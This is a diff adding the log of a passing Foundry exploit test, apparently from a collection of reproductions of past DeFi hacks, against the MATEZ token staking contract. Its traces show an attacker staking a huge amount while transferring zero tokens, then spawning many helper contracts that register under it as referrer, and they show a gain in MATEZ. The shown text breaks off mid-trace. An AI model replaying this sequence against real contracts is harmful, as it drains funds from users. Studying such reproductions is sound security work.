@@ -1,0 +1,400 @@
+No files changed, compilation skipped
+
+Ran 1 test for src/test/2024-11/Matez_exp.sol:Matez
+[PASS] testExploit() (gas: 7204426)
+Logs:
+  Attacker MATEZ Balance Before exploit: 0.000000000000000000
+  Attacker MATEZ Balance After exploit: 1.753044885823151963
+
+Traces:
+  [7204426] Matez::testExploit()
+    ├─ [3081] 0x010C0D77055A26D09bb474EF8d81975F55bd8Fc9::symbol() [staticcall]
+    │   └─ ← [Return] "MATEZ"
+    ├─ [2531] 0x010C0D77055A26D09bb474EF8d81975F55bd8Fc9::balanceOf(Matez: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [2336] 0x010C0D77055A26D09bb474EF8d81975F55bd8Fc9::decimals() [staticcall]
+    │   └─ ← [Return] 18
+    ├─ emit log_named_decimal_uint(key: "Attacker MATEZ Balance Before exploit", val: 0, decimals: 18)
+    ├─ [100817] 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa::register(0x80d93e9451A6830e9A531f15CCa42Cb0357D511f)
+    │   ├─ emit Register(: 3614, : Matez: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], : 1)
+    │   └─ ← [Stop]
+    ├─ [159879] 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa::stake(340282366920938463463374607431768211456 [3.402e38])
+    │   ├─ [11376] 0xC0319e8f278BE2228Fd0baD12EdFEC7B25d16d54::observe([1, 0]) [staticcall]
+    │   │   └─ ← [Return] [234165454722 [2.341e11], 234165502094 [2.341e11]], [735109582075494098706955 [7.351e23], 735109617701852568449015 [7.351e23]]
+    │   ├─ [10034] 0x010C0D77055A26D09bb474EF8d81975F55bd8Fc9::transferFrom(Matez: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa, 0)
+    │   │   ├─ emit Transfer(from: Matez: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa, value: 0)
+    │   │   ├─ emit Approval(owner: Matez: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa, value: 0)
+    │   │   └─ ← [Return] true
+    │   ├─ emit upgrade_package(: 3614, : 340282366920938463463374607431768211456 [3.402e38])
+    │   └─ ← [Stop]
+    ├─ [281464] → new AttackContract@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
+    │   ├─ [92017] 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa::register(Matez: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   ├─ emit Register(: 3615, : AttackContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], : 3614)
+    │   │   └─ ← [Stop]
+    │   ├─ [176029] 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa::stake(340282366920938463463374607431768211456 [3.402e38])
+    │   │   ├─ [5376] 0xC0319e8f278BE2228Fd0baD12EdFEC7B25d16d54::observe([1, 0]) [staticcall]
+    │   │   │   └─ ← [Return] [234165454722 [2.341e11], 234165502094 [2.341e11]], [735109582075494098706955 [7.351e23], 735109617701852568449015 [7.351e23]]
+    │   │   ├─ [10034] 0x010C0D77055A26D09bb474EF8d81975F55bd8Fc9::transferFrom(AttackContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa, 0)
+    │   │   │   ├─ emit Transfer(from: AttackContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa, value: 0)
+    │   │   │   ├─ emit Approval(owner: AttackContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], spender: 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa, value: 0)
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ emit upgrade_package(: 3615, : 340282366920938463463374607431768211456 [3.402e38])
+    │   │   └─ ← [Stop]
+    │   └─ ← [Return] 62 bytes of code
+    ├─ [237664] → new AttackContract@0x2e234DAe75C793f67A35089C9d99245E1C58470b
+    │   ├─ [92017] 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa::register(Matez: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   ├─ emit Register(: 3616, : AttackContract: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], : 3614)
+    │   │   └─ ← [Stop]
+    │   ├─ [132229] 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa::stake(340282366920938463463374607431768211456 [3.402e38])
+    │   │   ├─ [5376] 0xC0319e8f278BE2228Fd0baD12EdFEC7B25d16d54::observe([1, 0]) [staticcall]
+    │   │   │   └─ ← [Return] [234165454722 [2.341e11], 234165502094 [2.341e11]], [735109582075494098706955 [7.351e23], 735109617701852568449015 [7.351e23]]
+    │   │   ├─ [10034] 0x010C0D77055A26D09bb474EF8d81975F55bd8Fc9::transferFrom(AttackContract: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa, 0)
+    │   │   │   ├─ emit Transfer(from: AttackContract: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], to: 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa, value: 0)
+    │   │   │   ├─ emit Approval(owner: AttackContract: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], spender: 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa, value: 0)
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ emit upgrade_package(: 3616, : 340282366920938463463374607431768211456 [3.402e38])
+    │   │   └─ ← [Stop]
+    │   └─ ← [Return] 62 bytes of code
+    ├─ [237664] → new AttackContract@0xF62849F9A0B5Bf2913b396098F7c7019b51A820a
+    │   ├─ [92017] 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa::register(Matez: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   ├─ emit Register(: 3617, : AttackContract: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], : 3614)
+    │   │   └─ ← [Stop]
+    │   ├─ [132229] 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa::stake(340282366920938463463374607431768211456 [3.402e38])
+    │   │   ├─ [5376] 0xC0319e8f278BE2228Fd0baD12EdFEC7B25d16d54::observe([1, 0]) [staticcall]
+    │   │   │   └─ ← [Return] [234165454722 [2.341e11], 234165502094 [2.341e11]], [735109582075494098706955 [7.351e23], 735109617701852568449015 [7.351e23]]
+    │   │   ├─ [10034] 0x010C0D77055A26D09bb474EF8d81975F55bd8Fc9::transferFrom(AttackContract: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa, 0)
+    │   │   │   ├─ emit Transfer(from: AttackContract: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], to: 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa, value: 0)
+    │   │   │   ├─ emit Approval(owner: AttackContract: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], spender: 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa, value: 0)
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ emit upgrade_package(: 3617, : 340282366920938463463374607431768211456 [3.402e38])
+    │   │   └─ ← [Stop]
+    │   └─ ← [Return] 62 bytes of code
+    ├─ [237664] → new AttackContract@0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9
+    │   ├─ [92017] 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa::register(Matez: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   ├─ emit Register(: 3618, : AttackContract: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], : 3614)
+    │   │   └─ ← [Stop]
+    │   ├─ [132229] 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa::stake(340282366920938463463374607431768211456 [3.402e38])
+    │   │   ├─ [5376] 0xC0319e8f278BE2228Fd0baD12EdFEC7B25d16d54::observe([1, 0]) [staticcall]
+    │   │   │   └─ ← [Return] [234165454722 [2.341e11], 234165502094 [2.341e11]], [735109582075494098706955 [7.351e23], 735109617701852568449015 [7.351e23]]
+    │   │   ├─ [10034] 0x010C0D77055A26D09bb474EF8d81975F55bd8Fc9::transferFrom(AttackContract: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa, 0)
+    │   │   │   ├─ emit Transfer(from: AttackContract: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], to: 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa, value: 0)
+    │   │   │   ├─ emit Approval(owner: AttackContract: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], spender: 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa, value: 0)
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ emit upgrade_package(: 3618, : 340282366920938463463374607431768211456 [3.402e38])
+    │   │   └─ ← [Stop]
+    │   └─ ← [Return] 62 bytes of code
+    ├─ [237664] → new AttackContract@0xc7183455a4C133Ae270771860664b6B7ec320bB1
+    │   ├─ [92017] 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa::register(Matez: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   ├─ emit Register(: 3619, : AttackContract: [0xc7183455a4C133Ae270771860664b6B7ec320bB1], : 3614)
+    │   │   └─ ← [Stop]
+    │   ├─ [132229] 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa::stake(340282366920938463463374607431768211456 [3.402e38])
+    │   │   ├─ [5376] 0xC0319e8f278BE2228Fd0baD12EdFEC7B25d16d54::observe([1, 0]) [staticcall]
+    │   │   │   └─ ← [Return] [234165454722 [2.341e11], 234165502094 [2.341e11]], [735109582075494098706955 [7.351e23], 735109617701852568449015 [7.351e23]]
+    │   │   ├─ [10034] 0x010C0D77055A26D09bb474EF8d81975F55bd8Fc9::transferFrom(AttackContract: [0xc7183455a4C133Ae270771860664b6B7ec320bB1], 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa, 0)
+    │   │   │   ├─ emit Transfer(from: AttackContract: [0xc7183455a4C133Ae270771860664b6B7ec320bB1], to: 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa, value: 0)
+    │   │   │   ├─ emit Approval(owner: AttackContract: [0xc7183455a4C133Ae270771860664b6B7ec320bB1], spender: 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa, value: 0)
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ emit upgrade_package(: 3619, : 340282366920938463463374607431768211456 [3.402e38])
+    │   │   └─ ← [Stop]
+    │   └─ ← [Return] 62 bytes of code
+    ├─ [237664] → new AttackContract@0xa0Cb889707d426A7A386870A03bc70d1b0697598
+    │   ├─ [92017] 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa::register(Matez: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   ├─ emit Register(: 3620, : AttackContract: [0xa0Cb889707d426A7A386870A03bc70d1b0697598], : 3614)
+    │   │   └─ ← [Stop]
+    │   ├─ [132229] 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa::stake(340282366920938463463374607431768211456 [3.402e38])
+    │   │   ├─ [5376] 0xC0319e8f278BE2228Fd0baD12EdFEC7B25d16d54::observe([1, 0]) [staticcall]
+    │   │   │   └─ ← [Return] [234165454722 [2.341e11], 234165502094 [2.341e11]], [735109582075494098706955 [7.351e23], 735109617701852568449015 [7.351e23]]
+    │   │   ├─ [10034] 0x010C0D77055A26D09bb474EF8d81975F55bd8Fc9::transferFrom(AttackContract: [0xa0Cb889707d426A7A386870A03bc70d1b0697598], 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa, 0)
+    │   │   │   ├─ emit Transfer(from: AttackContract: [0xa0Cb889707d426A7A386870A03bc70d1b0697598], to: 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa, value: 0)
+    │   │   │   ├─ emit Approval(owner: AttackContract: [0xa0Cb889707d426A7A386870A03bc70d1b0697598], spender: 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa, value: 0)
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ emit upgrade_package(: 3620, : 340282366920938463463374607431768211456 [3.402e38])
+    │   │   └─ ← [Stop]
+    │   └─ ← [Return] 62 bytes of code
+    ├─ [237664] → new AttackContract@0x1d1499e622D69689cdf9004d05Ec547d650Ff211
+    │   ├─ [92017] 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa::register(Matez: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   ├─ emit Register(: 3621, : AttackContract: [0x1d1499e622D69689cdf9004d05Ec547d650Ff211], : 3614)
+    │   │   └─ ← [Stop]
+    │   ├─ [132229] 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa::stake(340282366920938463463374607431768211456 [3.402e38])
+    │   │   ├─ [5376] 0xC0319e8f278BE2228Fd0baD12EdFEC7B25d16d54::observe([1, 0]) [staticcall]
+    │   │   │   └─ ← [Return] [234165454722 [2.341e11], 234165502094 [2.341e11]], [735109582075494098706955 [7.351e23], 735109617701852568449015 [7.351e23]]
+    │   │   ├─ [10034] 0x010C0D77055A26D09bb474EF8d81975F55bd8Fc9::transferFrom(AttackContract: [0x1d1499e622D69689cdf9004d05Ec547d650Ff211], 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa, 0)
+    │   │   │   ├─ emit Transfer(from: AttackContract: [0x1d1499e622D69689cdf9004d05Ec547d650Ff211], to: 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa, value: 0)
+    │   │   │   ├─ emit Approval(owner: AttackContract: [0x1d1499e622D69689cdf9004d05Ec547d650Ff211], spender: 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa, value: 0)
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ emit upgrade_package(: 3621, : 340282366920938463463374607431768211456 [3.402e38])
+    │   │   └─ ← [Stop]
+    │   └─ ← [Return] 62 bytes of code
+    ├─ [237664] → new AttackContract@0xA4AD4f68d0b91CFD19687c881e50f3A00242828c
+    │   ├─ [92017] 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa::register(Matez: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   ├─ emit Register(: 3622, : AttackContract: [0xA4AD4f68d0b91CFD19687c881e50f3A00242828c], : 3614)
+    │   │   └─ ← [Stop]
+    │   ├─ [132229] 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa::stake(340282366920938463463374607431768211456 [3.402e38])
+    │   │   ├─ [5376] 0xC0319e8f278BE2228Fd0baD12EdFEC7B25d16d54::observe([1, 0]) [staticcall]
+    │   │   │   └─ ← [Return] [234165454722 [2.341e11], 234165502094 [2.341e11]], [735109582075494098706955 [7.351e23], 735109617701852568449015 [7.351e23]]
+    │   │   ├─ [10034] 0x010C0D77055A26D09bb474EF8d81975F55bd8Fc9::transferFrom(AttackContract: [0xA4AD4f68d0b91CFD19687c881e50f3A00242828c], 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa, 0)
+    │   │   │   ├─ emit Transfer(from: AttackContract: [0xA4AD4f68d0b91CFD19687c881e50f3A00242828c], to: 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa, value: 0)
+    │   │   │   ├─ emit Approval(owner: AttackContract: [0xA4AD4f68d0b91CFD19687c881e50f3A00242828c], spender: 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa, value: 0)
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ emit upgrade_package(: 3622, : 340282366920938463463374607431768211456 [3.402e38])
+    │   │   └─ ← [Stop]
+    │   └─ ← [Return] 62 bytes of code
+    ├─ [237664] → new AttackContract@0x03A6a84cD762D9707A21605b548aaaB891562aAb
+    │   ├─ [92017] 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa::register(Matez: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   ├─ emit Register(: 3623, : AttackContract: [0x03A6a84cD762D9707A21605b548aaaB891562aAb], : 3614)
+    │   │   └─ ← [Stop]
+    │   ├─ [132229] 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa::stake(340282366920938463463374607431768211456 [3.402e38])
+    │   │   ├─ [5376] 0xC0319e8f278BE2228Fd0baD12EdFEC7B25d16d54::observe([1, 0]) [staticcall]
+    │   │   │   └─ ← [Return] [234165454722 [2.341e11], 234165502094 [2.341e11]], [735109582075494098706955 [7.351e23], 735109617701852568449015 [7.351e23]]
+    │   │   ├─ [10034] 0x010C0D77055A26D09bb474EF8d81975F55bd8Fc9::transferFrom(AttackContract: [0x03A6a84cD762D9707A21605b548aaaB891562aAb], 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa, 0)
+    │   │   │   ├─ emit Transfer(from: AttackContract: [0x03A6a84cD762D9707A21605b548aaaB891562aAb], to: 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa, value: 0)
+    │   │   │   ├─ emit Approval(owner: AttackContract: [0x03A6a84cD762D9707A21605b548aaaB891562aAb], spender: 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa, value: 0)
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ emit upgrade_package(: 3623, : 340282366920938463463374607431768211456 [3.402e38])
+    │   │   └─ ← [Stop]
+    │   └─ ← [Return] 62 bytes of code
+    ├─ [237664] → new AttackContract@0xD6BbDE9174b1CdAa358d2Cf4D57D1a9F7178FBfF
+    │   ├─ [92017] 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa::register(Matez: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   ├─ emit Register(: 3624, : AttackContract: [0xD6BbDE9174b1CdAa358d2Cf4D57D1a9F7178FBfF], : 3614)
+    │   │   └─ ← [Stop]
+    │   ├─ [132229] 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa::stake(340282366920938463463374607431768211456 [3.402e38])
+    │   │   ├─ [5376] 0xC0319e8f278BE2228Fd0baD12EdFEC7B25d16d54::observe([1, 0]) [staticcall]
+    │   │   │   └─ ← [Return] [234165454722 [2.341e11], 234165502094 [2.341e11]], [735109582075494098706955 [7.351e23], 735109617701852568449015 [7.351e23]]
+    │   │   ├─ [10034] 0x010C0D77055A26D09bb474EF8d81975F55bd8Fc9::transferFrom(AttackContract: [0xD6BbDE9174b1CdAa358d2Cf4D57D1a9F7178FBfF], 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa, 0)
+    │   │   │   ├─ emit Transfer(from: AttackContract: [0xD6BbDE9174b1CdAa358d2Cf4D57D1a9F7178FBfF], to: 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa, value: 0)
+    │   │   │   ├─ emit Approval(owner: AttackContract: [0xD6BbDE9174b1CdAa358d2Cf4D57D1a9F7178FBfF], spender: 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa, value: 0)
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ emit upgrade_package(: 3624, : 340282366920938463463374607431768211456 [3.402e38])
+    │   │   └─ ← [Stop]
+    │   └─ ← [Return] 62 bytes of code
+    ├─ [237664] → new AttackContract@0x15cF58144EF33af1e14b5208015d11F9143E27b9
+    │   ├─ [92017] 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa::register(Matez: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   ├─ emit Register(: 3625, : AttackContract: [0x15cF58144EF33af1e14b5208015d11F9143E27b9], : 3614)
+    │   │   └─ ← [Stop]
+    │   ├─ [132229] 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa::stake(340282366920938463463374607431768211456 [3.402e38])
+    │   │   ├─ [5376] 0xC0319e8f278BE2228Fd0baD12EdFEC7B25d16d54::observe([1, 0]) [staticcall]
+    │   │   │   └─ ← [Return] [234165454722 [2.341e11], 234165502094 [2.341e11]], [735109582075494098706955 [7.351e23], 735109617701852568449015 [7.351e23]]
+    │   │   ├─ [10034] 0x010C0D77055A26D09bb474EF8d81975F55bd8Fc9::transferFrom(AttackContract: [0x15cF58144EF33af1e14b5208015d11F9143E27b9], 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa, 0)
+    │   │   │   ├─ emit Transfer(from: AttackContract: [0x15cF58144EF33af1e14b5208015d11F9143E27b9], to: 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa, value: 0)
+    │   │   │   ├─ emit Approval(owner: AttackContract: [0x15cF58144EF33af1e14b5208015d11F9143E27b9], spender: 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa, value: 0)
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ emit upgrade_package(: 3625, : 340282366920938463463374607431768211456 [3.402e38])
+    │   │   └─ ← [Stop]
+    │   └─ ← [Return] 62 bytes of code
+    ├─ [237664] → new AttackContract@0x212224D2F2d262cd093eE13240ca4873fcCBbA3C
+    │   ├─ [92017] 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa::register(Matez: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   ├─ emit Register(: 3626, : AttackContract: [0x212224D2F2d262cd093eE13240ca4873fcCBbA3C], : 3614)
+    │   │   └─ ← [Stop]
+    │   ├─ [132229] 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa::stake(340282366920938463463374607431768211456 [3.402e38])
+    │   │   ├─ [5376] 0xC0319e8f278BE2228Fd0baD12EdFEC7B25d16d54::observe([1, 0]) [staticcall]
+    │   │   │   └─ ← [Return] [234165454722 [2.341e11], 234165502094 [2.341e11]], [735109582075494098706955 [7.351e23], 735109617701852568449015 [7.351e23]]
+    │   │   ├─ [10034] 0x010C0D77055A26D09bb474EF8d81975F55bd8Fc9::transferFrom(AttackContract: [0x212224D2F2d262cd093eE13240ca4873fcCBbA3C], 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa, 0)
+    │   │   │   ├─ emit Transfer(from: AttackContract: [0x212224D2F2d262cd093eE13240ca4873fcCBbA3C], to: 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa, value: 0)
+    │   │   │   ├─ emit Approval(owner: AttackContract: [0x212224D2F2d262cd093eE13240ca4873fcCBbA3C], spender: 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa, value: 0)
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ emit upgrade_package(: 3626, : 340282366920938463463374607431768211456 [3.402e38])
+    │   │   └─ ← [Stop]
+    │   └─ ← [Return] 62 bytes of code
+    ├─ [237664] → new AttackContract@0x2a07706473244BC757E10F2a9E86fB532828afe3
+    │   ├─ [92017] 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa::register(Matez: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   ├─ emit Register(: 3627, : AttackContract: [0x2a07706473244BC757E10F2a9E86fB532828afe3], : 3614)
+    │   │   └─ ← [Stop]
+    │   ├─ [132229] 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa::stake(340282366920938463463374607431768211456 [3.402e38])
+    │   │   ├─ [5376] 0xC0319e8f278BE2228Fd0baD12EdFEC7B25d16d54::observe([1, 0]) [staticcall]
+    │   │   │   └─ ← [Return] [234165454722 [2.341e11], 234165502094 [2.341e11]], [735109582075494098706955 [7.351e23], 735109617701852568449015 [7.351e23]]
+    │   │   ├─ [10034] 0x010C0D77055A26D09bb474EF8d81975F55bd8Fc9::transferFrom(AttackContract: [0x2a07706473244BC757E10F2a9E86fB532828afe3], 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa, 0)
+    │   │   │   ├─ emit Transfer(from: AttackContract: [0x2a07706473244BC757E10F2a9E86fB532828afe3], to: 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa, value: 0)
+    │   │   │   ├─ emit Approval(owner: AttackContract: [0x2a07706473244BC757E10F2a9E86fB532828afe3], spender: 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa, value: 0)
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ emit upgrade_package(: 3627, : 340282366920938463463374607431768211456 [3.402e38])
+    │   │   └─ ← [Stop]
+    │   └─ ← [Return] 62 bytes of code
+    ├─ [237664] → new AttackContract@0x3D7Ebc40AF7092E3F1C81F2e996cbA5Cae2090d7
+    │   ├─ [92017] 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa::register(Matez: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   ├─ emit Register(: 3628, : AttackContract: [0x3D7Ebc40AF7092E3F1C81F2e996cbA5Cae2090d7], : 3614)
+    │   │   └─ ← [Stop]
+    │   ├─ [132229] 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa::stake(340282366920938463463374607431768211456 [3.402e38])
+    │   │   ├─ [5376] 0xC0319e8f278BE2228Fd0baD12EdFEC7B25d16d54::observe([1, 0]) [staticcall]
+    │   │   │   └─ ← [Return] [234165454722 [2.341e11], 234165502094 [2.341e11]], [735109582075494098706955 [7.351e23], 735109617701852568449015 [7.351e23]]
+    │   │   ├─ [10034] 0x010C0D77055A26D09bb474EF8d81975F55bd8Fc9::transferFrom(AttackContract: [0x3D7Ebc40AF7092E3F1C81F2e996cbA5Cae2090d7], 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa, 0)
+    │   │   │   ├─ emit Transfer(from: AttackContract: [0x3D7Ebc40AF7092E3F1C81F2e996cbA5Cae2090d7], to: 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa, value: 0)
+    │   │   │   ├─ emit Approval(owner: AttackContract: [0x3D7Ebc40AF7092E3F1C81F2e996cbA5Cae2090d7], spender: 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa, value: 0)
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ emit upgrade_package(: 3628, : 340282366920938463463374607431768211456 [3.402e38])
+    │   │   └─ ← [Stop]
+    │   └─ ← [Return] 62 bytes of code
+    ├─ [237664] → new AttackContract@0xD16d567549A2a2a2005aEACf7fB193851603dd70
+    │   ├─ [92017] 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa::register(Matez: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   ├─ emit Register(: 3629, : AttackContract: [0xD16d567549A2a2a2005aEACf7fB193851603dd70], : 3614)
+    │   │   └─ ← [Stop]
+    │   ├─ [132229] 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa::stake(340282366920938463463374607431768211456 [3.402e38])
+    │   │   ├─ [5376] 0xC0319e8f278BE2228Fd0baD12EdFEC7B25d16d54::observe([1, 0]) [staticcall]
+    │   │   │   └─ ← [Return] [234165454722 [2.341e11], 234165502094 [2.341e11]], [735109582075494098706955 [7.351e23], 735109617701852568449015 [7.351e23]]
+    │   │   ├─ [10034] 0x010C0D77055A26D09bb474EF8d81975F55bd8Fc9::transferFrom(AttackContract: [0xD16d567549A2a2a2005aEACf7fB193851603dd70], 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa, 0)
+    │   │   │   ├─ emit Transfer(from: AttackContract: [0xD16d567549A2a2a2005aEACf7fB193851603dd70], to: 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa, value: 0)
+    │   │   │   ├─ emit Approval(owner: AttackContract: [0xD16d567549A2a2a2005aEACf7fB193851603dd70], spender: 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa, value: 0)
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ emit upgrade_package(: 3629, : 340282366920938463463374607431768211456 [3.402e38])
+    │   │   └─ ← [Stop]
+    │   └─ ← [Return] 62 bytes of code
+    ├─ [237664] → new AttackContract@0x96d3F6c20EEd2697647F543fE6C08bC2Fbf39758
+    │   ├─ [92017] 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa::register(Matez: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   ├─ emit Register(: 3630, : AttackContract: [0x96d3F6c20EEd2697647F543fE6C08bC2Fbf39758], : 3614)
+    │   │   └─ ← [Stop]
+    │   ├─ [132229] 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa::stake(340282366920938463463374607431768211456 [3.402e38])
+    │   │   ├─ [5376] 0xC0319e8f278BE2228Fd0baD12EdFEC7B25d16d54::observe([1, 0]) [staticcall]
+    │   │   │   └─ ← [Return] [234165454722 [2.341e11], 234165502094 [2.341e11]], [735109582075494098706955 [7.351e23], 735109617701852568449015 [7.351e23]]
+    │   │   ├─ [10034] 0x010C0D77055A26D09bb474EF8d81975F55bd8Fc9::transferFrom(AttackContract: [0x96d3F6c20EEd2697647F543fE6C08bC2Fbf39758], 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa, 0)
+    │   │   │   ├─ emit Transfer(from: AttackContract: [0x96d3F6c20EEd2697647F543fE6C08bC2Fbf39758], to: 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa, value: 0)
+    │   │   │   ├─ emit Approval(owner: AttackContract: [0x96d3F6c20EEd2697647F543fE6C08bC2Fbf39758], spender: 0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa, value: 0)
+    │   │   │   └─ ← [Return] true
